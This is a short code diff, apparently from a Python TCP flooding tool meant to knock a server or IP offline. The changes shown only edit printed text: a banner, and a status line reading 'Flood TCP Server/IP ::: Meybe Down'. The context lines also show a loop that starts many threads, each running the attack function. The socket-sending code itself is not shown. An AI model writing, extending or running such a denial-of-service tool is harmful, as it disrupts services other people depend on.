@@ -50,7 +50,7 @@ print("\033[4m---------->75%  "),
 time.sleep(5),
 print("\033[1m------------->100%"),
 time.sleep(5),
-print("\033[33m  B8SMILLAH.."),
+print("\033[33m  B I S M I L L A H...."),
 time.sleep(5),  
 def animated_marker():
     widgets = ['\033[94mLoading: progressbar.AnimatedMaker()\033[0m']
@@ -77,7 +77,7 @@ def start():
 
     except:
         s.close()
-        print("\033[97m[★\033[97m]  \033[32mFlood\033[37mTCP  \033[38mServer/IP\033[93m::: \033[32mMeybe\033[33mDown \033[0m")
+        print("\033[97m[" +str(u)+ "] \033[32mFlood\033[33mTCP  \033[38mServer/IP\033[93m::: \033[32mMeybe\033[33mDown \033[0m")
 for x in range(thread):
   thred = threading.Thread(target=start)
   thred.start()
